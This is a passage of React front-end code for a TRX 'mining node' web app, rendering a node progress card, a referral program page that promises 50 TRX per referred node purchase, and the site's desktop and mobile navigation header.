                        <span className="font-semibold">{Math.round(userNode.progress)}%</span>
                      </div>
                      <Progress value={userNode.progress} className="h-2" />
                      <div className="flex justify-between text-sm text-gray-600">
                        <span>Total: {userNode.miningAmount} TRX</span>
                        <span>Ends: {new Date(userNode.endDate).toLocaleDateString()}</span>
                      </div>
                    </div>
                  </div>
                )
              })}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  )

  // Referral Page
  const ReferralPage = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-3xl font-bold text-gray-900 mb-2">Referral Program</h2>
        <p className="text-gray-600">Earn 50 TRX for every valid referral</p>
      </div>

      {/* Referral Code */}
      <Card>
        <CardHeader className="bg-gradient-to-r from-purple-500 to-pink-500 text-white">
          <CardTitle className="flex items-center gap-2">
            <UserPlus className="h-5 w-5" />
            Your Referral Code
          </CardTitle>
        </CardHeader>
        <CardContent className="p-6">
          <div className="text-center">
            <div className="text-3xl font-bold text-purple-600 mb-2">{userProfile?.referralCode || 'DEMO123'}</div>
            <p className="text-gray-600 text-sm mb-4">Share this code with friends to earn rewards</p>
            <Button
              onClick={() => copyToClipboard(userProfile?.referralCode || 'DEMO123')}
              className="bg-purple-600 hover:bg-purple-700"
            >
              <Copy className="h-4 w-4 mr-2" />
              Copy Code
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* How It Works */}
      <Card>
        <CardHeader>
          <CardTitle>How Referral System Works</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className="flex items-start gap-4">
              <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                <span className="text-blue-600 font-bold text-sm">1</span>
              </div>
              <div>
                <h4 className="font-semibold text-gray-900">Share Your Code</h4>
                <p className="text-gray-600 text-sm">Friend signs up using your referral code</p>
              </div>
            </div>
            
            <div className="flex items-start gap-4">
              <div className="w-8 h-8 bg-orange-100 rounded-full flex items-center justify-center">
                <span className="text-orange-600 font-bold text-sm">2</span>
              </div>
              <div>
                <h4 className="font-semibold text-gray-900">They Buy Node</h4>
                <p className="text-gray-600 text-sm">Friend purchases any mining node to become valid</p>
              </div>
            </div>
            
            <div className="flex items-start gap-4">
              <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                <span className="text-green-600 font-bold text-sm">3</span>
              </div>
              <div>
                <h4 className="font-semibold text-gray-900">You Earn 50 TRX</h4>
                <p className="text-gray-600 text-sm">Instant reward added to your referral balance</p>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Referral Stats */}
      <div className="grid md:grid-cols-2 gap-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Clock className="h-5 w-5 text-orange-600" />
              Invalid Referrals
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-center">
              <div className="text-3xl font-bold text-orange-600 mb-2">
                {referrals.filter(r => !r.isValid).length}
              </div>
              <p className="text-gray-600 text-sm">Signed up, haven't bought node yet</p>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CheckCircle className="h-5 w-5 text-green-600" />
              Valid Referrals
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-center">
              <div className="text-3xl font-bold text-green-600 mb-2">
                {referrals.filter(r => r.isValid).length}
              </div>
              <p className="text-gray-600 text-sm">Purchased node, earned you 50 TRX</p>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Referral History */}
      {referrals.length > 0 && (
        <Card>
          <CardHeader>
            <CardTitle>Referral History</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              {referrals.map((referral) => (
                <div key={referral.id} className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                  <div>
                    <div className="font-semibold text-gray-900">User #{referral.referredId.slice(-6)}</div>
                    <div className="text-gray-600 text-sm">
                      Joined: {new Date(referral.createdAt).toLocaleDateString()}
                    </div>
                  </div>
                  <Badge className={referral.isValid ? 'bg-green-500' : 'bg-orange-500'}>
                    {referral.isValid ? 'Valid - 50 TRX' : 'Invalid - 0 TRX'}
                  </Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  )

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow-sm border-b sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <h1 className="text-2xl font-bold text-gray-900">
                Mine<span className="text-blue-600">TRX</span>With
              </h1>
            </div>
            
            {/* Desktop Navigation */}
            <nav className="hidden md:flex items-center space-x-1">
              <NavButton 
                page="home" 
                icon={Home} 
                label="Home" 
                isActive={currentPage === 'home'}
                onClick={() => setCurrentPage('home')}
              />
              <NavButton 
                page="profile" 
                icon={User} 
                label="Profile" 
                isActive={currentPage === 'profile'}
                onClick={() => setCurrentPage('profile')}
              />
              <NavButton 
                page="referral" 
                icon={Users} 
                label="Referral" 
                isActive={currentPage === 'referral'}
                onClick={() => setCurrentPage('referral')}
              />
              
              <Button
                variant="ghost"
                size="sm"
                onClick={signOut}
                className="ml-4 text-gray-600 hover:text-gray-900"
              >
                <LogOut className="h-4 w-4 mr-2" />
                Sign Out
              </Button>
            </nav>

            {/* Mobile Menu Button */}
            <Button
              variant="ghost"
              size="sm"
              className="md:hidden"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
            >
              {mobileMenuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
            </Button>
          </div>

          {/* Mobile Menu */}
          {mobileMenuOpen && (
            <div className="md:hidden py-4 border-t">
              <div className="space-y-2">
                <Button
                  variant={currentPage === 'home' ? 'default' : 'ghost'}
                  className="w-full justify-start"
                  onClick={() => {
                    setCurrentPage('home')
                    setMobileMenuOpen(false)
                  }}
                >
                  <Home className="h-4 w-4 mr-2" />
                  Home
                </Button>
                <Button
                  variant={currentPage === 'profile' ? 'default' : 'ghost'}
                  className="w-full justify-start"
                  onClick={() => {
                    setCurrentPage('profile')
                    setMobileMenuOpen(false)
                  }}
                >
                  <User className="h-4 w-4 mr-2" />
                  Profile
                </Button>
                <Button
                  variant={currentPage === 'referral' ? 'default' : 'ghost'}
                  className="w-full justify-start"
                  onClick={() => {
                    setCurrentPage('referral')
                    setMobileMenuOpen(false)
                  }}
                >
                  <Users className="h-4 w-4 mr-2" />
                  Referral
                </Button>
                <Button
                  variant="ghost"
                  className="w-full justify-start text-red-600 hover:text-red-700"
                  onClick={signOut}
                >
                  <LogOut className="h-4 w-4 mr-2" />
                  Sign Out
                </Button>
              </div>
            </div>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {currentPage === 'home' && <HomePage />}
        {currentPage === 'profile' && <ProfilePage />}
        {currentPage === 'referral' && <ReferralPage />}
      </main>
    </div>
  )
}